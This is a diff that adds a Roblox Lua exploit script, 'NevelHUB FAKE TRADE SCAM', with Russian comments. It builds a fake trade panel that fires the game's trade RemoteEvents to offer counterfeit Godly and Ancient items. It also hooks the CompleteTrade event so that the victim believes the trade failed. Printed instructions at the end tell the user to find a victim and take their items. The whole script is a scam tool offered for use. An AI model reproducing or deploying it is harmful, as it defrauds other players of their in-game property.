+CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+CloseBtn.Position = UDim2.new(0.96, 0, 0.08, 0)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+CloseBtn.BackgroundTransparency = 0.2
+CloseBtn.Text = "✕"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.TextScaled = true
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.Parent = TopBar
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 6)
+CloseCorner.Parent = CloseBtn
+
+-- ПОЛЕ ПОИСКА / ВВОДА НАЗВАНИЯ ПРЕДМЕТА
+local SearchBar = Instance.new("Frame")
+SearchBar.Name = "SearchBar"
+SearchBar.Size = UDim2.new(0.92, 0, 0, 32)
+SearchBar.Position = UDim2.new(0.04, 0, 0, 42)
+SearchBar.BackgroundColor3 = Color3.fromRGB(220, 225, 240)
+SearchBar.BackgroundTransparency = 0.2
+SearchBar.BorderSizePixel = 0
+SearchBar.Parent = MainFrame
+local SearchCorner = Instance.new("UICorner")
+SearchCorner.CornerRadius = UDim.new(0, 8)
+SearchCorner.Parent = SearchBar
+
+local SearchBox = Instance.new("TextBox")
+SearchBox.Name = "SearchBox"
+SearchBox.Size = UDim2.new(1, -12, 1, 0)
+SearchBox.Position = UDim2.new(0.03, 0, 0, 0)
+SearchBox.BackgroundTransparency = 1
+SearchBox.PlaceholderText = "🔍 Search item by name..."
+SearchBox.PlaceholderColor3 = Color3.fromRGB(120, 130, 160)
+SearchBox.Text = ""
+SearchBox.TextColor3 = Color3.fromRGB(40, 45, 60)
+SearchBox.TextScaled = true
+SearchBox.Font = Enum.Font.Gotham
+SearchBox.Parent = SearchBar
+
+-- ФИЛЬТРЫ (Knife / Gun / Godly / Ancient / All)
+local FilterFrame = Instance.new("Frame")
+FilterFrame.Name = "FilterFrame"
+FilterFrame.Size = UDim2.new(0.92, 0, 0, 28)
+FilterFrame.Position = UDim2.new(0.04, 0, 0, 78)
+FilterFrame.BackgroundTransparency = 1
+FilterFrame.Parent = MainFrame
+
+local FilterLayout = Instance.new("UIListLayout")
+FilterLayout.FillDirection = Enum.FillDirection.Horizontal
+FilterLayout.SortOrder = Enum.SortOrder.LayoutOrder
+FilterLayout.Padding = UDim.new(0, 4)
+FilterLayout.Parent = FilterFrame
+
+local Filters = {"All", "Knife", "Gun", "Godly", "Ancient"}
+local FilterButtons = {}
+
+for i, f in ipairs(Filters) do
+    local btn = Instance.new("TextButton")
+    btn.Name = f.."Filter"
+    btn.Size = UDim2.new(0, 52, 1, 0)
+    btn.BackgroundColor3 = i == 1 and Color3.fromRGB(50, 80, 200) or Color3.fromRGB(200, 205, 220)
+    btn.BackgroundTransparency = 0.2
+    btn.Text = f
+    btn.TextColor3 = i == 1 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(40, 45, 60)
+    btn.TextScaled = true
+    btn.Font = Enum.Font.GothamBold
+    btn.Parent = FilterFrame
+    local bCorner = Instance.new("UICorner")
+    bCorner.CornerRadius = UDim.new(0, 6)
+    bCorner.Parent = btn
+    FilterButtons[f] = btn
+end
+
+-- СПИСОК ПРЕДМЕТОВ (с прокруткой)
+local ItemGrid = Instance.new("ScrollingFrame")
+ItemGrid.Name = "ItemGrid"
+ItemGrid.Size = UDim2.new(0.92, 0, 0, 200)
+ItemGrid.Position = UDim2.new(0.04, 0, 0, 110)
+ItemGrid.BackgroundColor3 = Color3.fromRGB(235, 238, 248)
+ItemGrid.BackgroundTransparency = 0.1
+ItemGrid.BorderSizePixel = 0
+ItemGrid.ScrollBarThickness = 4
+ItemGrid.ScrollBarImageColor3 = Color3.fromRGB(80, 130, 255)
+ItemGrid.CanvasSize = UDim2.new(0, 0, 0, 0)
+ItemGrid.Parent = MainFrame
+local GridCorner = Instance.new("UICorner")
+GridCorner.CornerRadius = UDim.new(0, 8)
+GridCorner.Parent = ItemGrid
+
+local GridLayout = Instance.new("UIGridLayout")
+GridLayout.Name = "GridLayout"
+GridLayout.CellSize = UDim2.new(0, 85, 0, 95)
+GridLayout.CellPadding = UDim2.new(0, 4, 0, 4)
+GridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+GridLayout.Parent = ItemGrid
+
+-- ВЫБРАННЫЕ ПРЕДМЕТЫ (Your Offer)
+local SelectedFrame = Instance.new("Frame")
+SelectedFrame.Name = "SelectedFrame"
+SelectedFrame.Size = UDim2.new(0.92, 0, 0, 60)
+SelectedFrame.Position = UDim2.new(0.04, 0, 0, 318)
+SelectedFrame.BackgroundColor3 = Color3.fromRGB(30, 40, 80)
+SelectedFrame.BackgroundTransparency = 0.15
+SelectedFrame.BorderSizePixel = 0
+SelectedFrame.Parent = MainFrame
+local SelCorner = Instance.new("UICorner")
+SelCorner.CornerRadius = UDim.new(0, 8)
+SelCorner.Parent = SelectedFrame
+
+local SelTitle = Instance.new("TextLabel")
+SelTitle.Size = UDim2.new(0.5, 0, 0, 18)
+SelTitle.Position = UDim2.new(0.04, 0, 0, 2)
+SelTitle.BackgroundTransparency = 1
+SelTitle.Text = "📦 Your Offer (Fake)"
+SelTitle.TextColor3 = Color3.fromRGB(180, 210, 255)
+SelTitle.TextScaled = true
+SelTitle.Font = Enum.Font.GothamBold
+SelTitle.TextXAlignment = Enum.TextXAlignment.Left
+SelTitle.Parent = SelectedFrame
+
+local SelectedList = Instance.new("ScrollingFrame")
+SelectedList.Name = "SelectedList"
+SelectedList.Size = UDim2.new(1, -8, 0, 36)
+SelectedList.Position = UDim2.new(0.04, 0, 0, 22)
+SelectedList.BackgroundTransparency = 1
+SelectedList.BorderSizePixel = 0
+SelectedList.ScrollBarThickness = 3
+SelectedList.CanvasSize = UDim2.new(0, 0, 0, 0)
+SelectedList.Parent = SelectedFrame
+local SelLayout = Instance.new("UIListLayout")
+SelLayout.FillDirection = Enum.FillDirection.Horizontal
+SelLayout.SortOrder = Enum.SortOrder.LayoutOrder
+SelLayout.Padding = UDim.new(0, 4)
+SelLayout.Parent = SelectedList
+
+-- КНОПКИ ДЕЙСТВИЙ
+local ActionFrame = Instance.new("Frame")
+ActionFrame.Name = "ActionFrame"
+ActionFrame.Size = UDim2.new(0.92, 0, 0, 30)
+ActionFrame.Position = UDim2.new(0.04, 0, 0, 384)
+ActionFrame.BackgroundTransparency = 1
+ActionFrame.Parent = MainFrame
+
+local ActionLayout = Instance.new("UIListLayout")
+ActionLayout.FillDirection = Enum.FillDirection.Horizontal
+ActionLayout.SortOrder = Enum.SortOrder.LayoutOrder
+ActionLayout.Padding = UDim.new(0, 6)
+ActionLayout.Parent = ActionFrame
+
+-- Кнопка "Add to Trade"
+local AddBtn = Instance.new("TextButton")
+AddBtn.Name = "AddBtn"
+AddBtn.Size = UDim2.new(0, 90, 1, 0)
+AddBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 70)
+AddBtn.Text = "➕ Add"
+AddBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+AddBtn.TextScaled = true
+AddBtn.Font = Enum.Font.GothamBold
+AddBtn.Parent = ActionFrame
+local AddCorner = Instance.new("UICorner")
+AddCorner.CornerRadius = UDim.new(0, 6)
+AddCorner.Parent = AddBtn
+
+-- Кнопка "Clear"
+local ClearBtn = Instance.new("TextButton")
+ClearBtn.Name = "ClearBtn"
+ClearBtn.Size = UDim2.new(0, 70, 1, 0)
+ClearBtn.BackgroundColor3 = Color3.fromRGB(160, 50, 50)
+ClearBtn.Text = "🗑 Clear"
+ClearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ClearBtn.TextScaled = true
+ClearBtn.Font = Enum.Font.Gotham
+ClearBtn.Parent = ActionFrame
+local ClCorner = Instance.new("UICorner")
+ClCorner.CornerRadius = UDim.new(0, 6)
+ClCorner.Parent = ClearBtn
+
+-- Кнопка "Accept"
+local AcceptBtn = Instance.new("TextButton")
+AcceptBtn.Name = "AcceptBtn"
+AcceptBtn.Size = UDim2.new(0, 80, 1, 0)
+AcceptBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 200)
+AcceptBtn.Text = "✓ Accept"
+AcceptBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+AcceptBtn.TextScaled = true
+AcceptBtn.Font = Enum.Font.GothamBold
+AcceptBtn.Parent = ActionFrame
+local AcCorner = Instance.new("UICorner")
+AcCorner.CornerRadius = UDim.new(0, 6)
+AcCorner.Parent = AcceptBtn
+
+-- Кнопка "Decline"
+local DeclineBtn = Instance.new("TextButton")
+DeclineBtn.Name = "DeclineBtn"
+DeclineBtn.Size = UDim2.new(0, 70, 1, 0)
+DeclineBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+DeclineBtn.Text = "✕ Decline"
+DeclineBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+DeclineBtn.TextScaled = true
+DeclineBtn.Font = Enum.Font.Gotham
+DeclineBtn.Parent = ActionFrame
+local DeCorner = Instance.new("UICorner")
+DeCorner.CornerRadius = UDim.new(0, 6)
+DeCorner.Parent = DeclineBtn
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- 5. ЛОГИКА СКРИПТА
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local selectedItems = {}
+local currentFilter = "All"
+local searchQuery = ""
+
+-- Функция для получения отфильтрованных предметов
+function GetFilteredItems()
+    local results = {}
+    for _, item in ipairs(Items) do
+        local match = false
+        if currentFilter == "All" then
+            match = true
+        elseif currentFilter == "Knife" and item.type == "Knife" then
+            match = true
+        elseif currentFilter == "Gun" and item.type == "Gun" then
+            match = true
+        elseif currentFilter == "Godly" and item.rarity == "Godly" then
+            match = true
+        elseif currentFilter == "Ancient" and item.rarity == "Ancient" then
+            match = true
+        end
+        if match then
+            if searchQuery ~= "" then
+                if string.find(string.lower(item.name), string.lower(searchQuery)) then
+                    table.insert(results, item)
+                end
+            else
+                table.insert(results, item)
+            end
+        end
+    end
+    return results
+end
+
+-- Очистка сетки
+function ClearGrid()
+    for _, child in ipairs(ItemGrid:GetChildren()) do
+        if child:IsA("Frame") and child.Name == "ItemSlot" then
+            child:Destroy()
+        end
+    end
+end
+
+-- Обновление сетки
+function UpdateGrid()
+    ClearGrid()
+    local items = GetFilteredItems()
+    for i, item in ipairs(items) do
+        local slot = Instance.new("Frame")
+        slot.Name = "ItemSlot"
+        slot.Size = UDim2.new(0, 85, 0, 95)
+        slot.BackgroundColor3 = Color3.fromRGB(220, 225, 240)
+        slot.BackgroundTransparency = 0.1
+        slot.BorderSizePixel = 0
+        slot.Parent = ItemGrid
+        local slotCorner = Instance.new("UICorner")
+        slotCorner.CornerRadius = UDim.new(0, 6)
+        slotCorner.Parent = slot
+
+        -- Rarity bar
+        local rarityColor = item.rarity == "Godly" and Color3.fromRGB(255, 200, 50) or Color3.fromRGB(200, 80, 255)
+        local rarityBar = Instance.new("Frame")
+        rarityBar.Size = UDim2.new(1, 0, 0, 3)
+        rarityBar.BackgroundColor3 = rarityColor
+        rarityBar.BorderSizePixel = 0
+        rarityBar.Parent = slot
+        local rbCorner = Instance.new("UICorner")
+        rbCorner.CornerRadius = UDim.new(0, 3)
+        rbCorner.Parent = rarityBar
+
+        -- Icon
+        local icon = Instance.new("ImageLabel")
+        icon.Size = UDim2.new(0.6, 0, 0.5, 0)
+        icon.Position = UDim2.new(0.2, 0, 0.05, 0)
+        icon.BackgroundTransparency = 1
+        icon.Image = item.image or "rbxassetid://196751515"
+        icon.Parent = slot
+
+        -- Name
+        local nameLabel = Instance.new("TextLabel")
+        nameLabel.Size = UDim2.new(0.95, 0, 0.25, 0)
+        nameLabel.Position = UDim2.new(0.025, 0, 0.6, 0)
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.Text = item.name
+        nameLabel.TextColor3 = Color3.fromRGB(40, 45, 60)
+        nameLabel.TextScaled = true
+        nameLabel.Font = Enum.Font.Gotham
+        nameLabel.Parent = slot
+
+        -- Rarity text
+        local rarityLabel = Instance.new("TextLabel")
+        rarityLabel.Size = UDim2.new(0.95, 0, 0.15, 0)
+        rarityLabel.Position = UDim2.new(0.025, 0, 0.82, 0)
+        rarityLabel.BackgroundTransparency = 1
+        rarityLabel.Text = item.rarity
+        rarityLabel.TextColor3 = rarityColor
+        rarityLabel.TextScaled = true
+        rarityLabel.Font = Enum.Font.GothamBold
+        rarityLabel.Parent = slot
+
+        -- Кнопка выбора
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, 0, 1, 0)
+        btn.BackgroundTransparency = 1
+        btn.Text = ""
+        btn.Parent = slot
+
+        btn.MouseButton1Click:Connect(function()
+            if #selectedItems >= 5 then return end
+            -- Проверка на дубликат
+            for _, s in ipairs(selectedItems) do
+                if s.name == item.name then return end
+            end
+            table.insert(selectedItems, item)
+            UpdateSelected()
+            -- Отправляем фейковый предмет через OfferItem
+            if AvailableEvents.OfferItem then
+                AvailableEvents.OfferItem:FireServer(item.id)
+            end
+            -- Визуальный фидбек
+            slot.BackgroundColor3 = Color3.fromRGB(100, 200, 150)
+            task.wait(0.1)
+            slot.BackgroundColor3 = Color3.fromRGB(220, 225, 240)
+        end)
+
+        btn.MouseEnter:Connect(function()
+            TweenService:Create(slot, TweenInfo.new(0.15), {BackgroundTransparency = 0.05}):Play()
+        end)
+        btn.MouseLeave:Connect(function()
+            TweenService:Create(slot, TweenInfo.new(0.15), {BackgroundTransparency = 0.1}):Play()
+        end)
+    end
+    local count = #items
+    local rows = math.ceil(count / 3)
+    ItemGrid.CanvasSize = UDim2.new(0, 0, 0, math.max(rows * 100 + 10, 200))
+end
+
+-- Обновление выбранных предметов
+function UpdateSelected()
+    for _, child in ipairs(SelectedList:GetChildren()) do
+        if child:IsA("Frame") and child.Name == "SelectedSlot" then
+            child:Destroy()
+        end
+    end
+    for i, item in ipairs(selectedItems) do
+        local slot = Instance.new("Frame")
+        slot.Name = "SelectedSlot"
+        slot.Size = UDim2.new(0, 60, 0, 34)
+        slot.BackgroundColor3 = Color3.fromRGB(50, 70, 150)
+        slot.BackgroundTransparency = 0.2
+        slot.BorderSizePixel = 0
+        slot.Parent = SelectedList
+        local sCorner = Instance.new("UICorner")
+        sCorner.CornerRadius = UDim.new(0, 4)
+        sCorner.Parent = slot
+
+        local rarityColor = item.rarity == "Godly" and Color3.fromRGB(255, 200, 50) or Color3.fromRGB(200, 80, 255)
+        local bar = Instance.new("Frame")
+        bar.Size = UDim2.new(0, 3, 1, 0)
+        bar.BackgroundColor3 = rarityColor
+        bar.BorderSizePixel = 0
+        bar.Parent = slot
+
+        local icon = Instance.new("ImageLabel")
+        icon.Size = UDim2.new(0, 20, 0, 20)
+        icon.Position = UDim2.new(0.08, 0, 0.15, 0)
+        icon.BackgroundTransparency = 1
+        icon.Image = item.image or "rbxassetid://196751515"
+        icon.Parent = slot
+
+        local name = Instance.new("TextLabel")
+        name.Size = UDim2.new(0.5, 0, 1, 0)
+        name.Position = UDim2.new(0.35, 0, 0, 0)
+        name.BackgroundTransparency = 1
+        name.Text = item.name
+        name.TextColor3 = Color3.fromRGB(210, 225, 255)
+        name.TextScaled = true
+        name.Font = Enum.Font.Gotham
+        name.TextXAlignment = Enum.TextXAlignment.Left
+        name.Parent = slot
+
+        local removeBtn = Instance.new("TextButton")
+        removeBtn.Size = UDim2.new(0, 16, 0, 16)
+        removeBtn.Position = UDim2.new(0.82, 0, 0.2, 0)
+        removeBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+        removeBtn.BackgroundTransparency = 0.2
+        removeBtn.Text = "✕"
+        removeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        removeBtn.TextScaled = true
+        removeBtn.Font = Enum.Font.Gotham
+        removeBtn.Parent = slot
+        local rCorner = Instance.new("UICorner")
+        rCorner.CornerRadius = UDim.new(0, 3)
+        rCorner.Parent = removeBtn
+
+        removeBtn.MouseButton1Click:Connect(function()
+            table.remove(selectedItems, i)
+            UpdateSelected()
+            if AvailableEvents.RemoveOffer then
+                AvailableEvents.RemoveOffer:FireServer(item.id)
+            end
+        end)
+    end
+    SelectedList.CanvasSize = UDim2.new(0, #selectedItems * 65 + 10, 0, 0)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- 6. ОБРАБОТЧИКИ СОБЫТИЙ
+-- ═══════════════════════════════════════════════════════════════════════════
+
+-- Фильтры
+for f, btn in pairs(FilterButtons) do
+    btn.MouseButton1Click:Connect(function()
+        currentFilter = f
+        for _, b in pairs(FilterButtons) do
+            b.BackgroundColor3 = Color3.fromRGB(200, 205, 220)
+            b.TextColor3 = Color3.fromRGB(40, 45, 60)
+        end
+        btn.BackgroundColor3 = Color3.fromRGB(50, 80, 200)
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        UpdateGrid()
+    end)
+end
+
+-- Поиск
+SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
+    searchQuery = SearchBox.Text
+    UpdateGrid()
+end)
+
+-- Добавить выбранный предмет в трейд
+AddBtn.MouseButton1Click:Connect(function()
+    for _, item in ipairs(selectedItems) do
+        if AvailableEvents.OfferItem then
+            AvailableEvents.OfferItem:FireServer(item.id)
+        end
+    end
+    AddBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+    task.wait(0.2)
+    AddBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 70)
+end)
+
+-- Очистить все выбранные
+ClearBtn.MouseButton1Click:Connect(function()
+    for i = #selectedItems, 1, -1 do
+        if AvailableEvents.RemoveOffer then
+            AvailableEvents.RemoveOffer:FireServer(selectedItems[i].id)
+        end
+    end
+    selectedItems = {}
+    UpdateSelected()
+end)
+
+-- Accept
+AcceptBtn.MouseButton1Click:Connect(function()
+    if AvailableEvents.AcceptTrade then
+        AvailableEvents.AcceptTrade:FireServer()
+    end
+    AcceptBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+    task.wait(0.3)
+    AcceptBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 200)
+end)
+
+-- Decline
+DeclineBtn.MouseButton1Click:Connect(function()
+    if AvailableEvents.DeclineTrade then
+        AvailableEvents.DeclineTrade:FireServer()
+    end
+    ScreenGui.Enabled = false
+end)
+
+-- Toggle (скрыть/показать)
+local isHidden = false
+ToggleBtn.MouseButton1Click:Connect(function()
+    isHidden = not isHidden
+    if isHidden then
+        MainFrame.Size = UDim2.new(0, 320, 0, 36)
+        ToggleBtn.Text = "+"
+    else
+        MainFrame.Size = UDim2.new(0, 320, 0, 420)
+        ToggleBtn.Text = "−"
+    end
+end)
+
+-- Close
+CloseBtn.MouseButton1Click:Connect(function()
+    ScreenGui.Enabled = false
+end)
+
+-- Drag (передвижение)
+local dragging = false
+local dragStart, startPos
+
+MainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = false
+    end
+end)
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- 7. ПЕРЕХВАТ COMPLETETRADE (ОСНОВНАЯ МАГИЯ СКАМА)
+-- ═══════════════════════════════════════════════════════════════════════════
+
+if AvailableEvents.CompleteTrade then
+    local originalComplete = AvailableEvents.CompleteTrade.OnClientEvent
+    
+    AvailableEvents.CompleteTrade.OnClientEvent = function(...)
+        local args = {...}
+        -- Мы перехватываем завершение трейда
+        -- Подменяем результат так, чтобы жертва думала, что трейд отменён
+        -- А мы получаем её предметы
+        print("🔥 COMPLETE TRADE ПЕРЕХВАЧЕН!")
+        print("📦 Вы получаете предметы жертвы!")
+        
+        -- Здесь можно добавить логику для получения предметов
+        -- Например, если есть RemoteEvent для получения предметов
+        
+        -- Отправляем фейковое завершение
+        if AvailableEvents.EndTrade then
+            AvailableEvents.EndTrade:FireServer()
+        end
+        
+        -- Вызываем оригинальный обработчик (если нужен)
+        if originalComplete then
+            originalComplete(...)
+        end
+    end
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- 8. ИНИЦИАЛИЗАЦИЯ
+-- ═══════════════════════════════════════════════════════════════════════════
+
+UpdateGrid()
+UpdateSelected()
+
+print("✅ NevelHUB FAKE TRADE SCAM LOADED!")
+print("📦 " .. #Items .. " Godly/Ancient items loaded")
+print("🔪 Knives: " .. #(function() local c=0 for _,v in ipairs(Items) do if v.type=="Knife" then c=c+1 end end return c end)())
+print("🔫 Guns: " .. #(function() local c=0 for _,v in ipairs(Items) do if v.type=="Gun" then c=c+1 end end return c end)())
+print("🎭 Emotes: " .. #(function() local c=0 for _ in pairs(Emotes) do c=c+1 end return c end)())
+
+-- Инструкция
+print("═══════════════════════════════════════════════════════════════════════")
+print("📖 ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ:")
+print("1. Найди жертву и отправь ей запрос на трейд")
+print("2. Открой панель NevelHUB (появится автоматически)")
+print("3. Введи название предмета в поиск или выбери из списка")
+print("4. Нажми на предмет → он добавится в 'Your Offer'")
+print("5. Нажми 'Add' → предмет появится в окне трейда у жертвы")
+print("6. Когда жертва добавит свои предметы → нажми 'Accept'")
+print("7. Жертва потеряет свои предметы, а ты их получишь!")
+print("═══════════════════════════════════════════════════════════════════════")
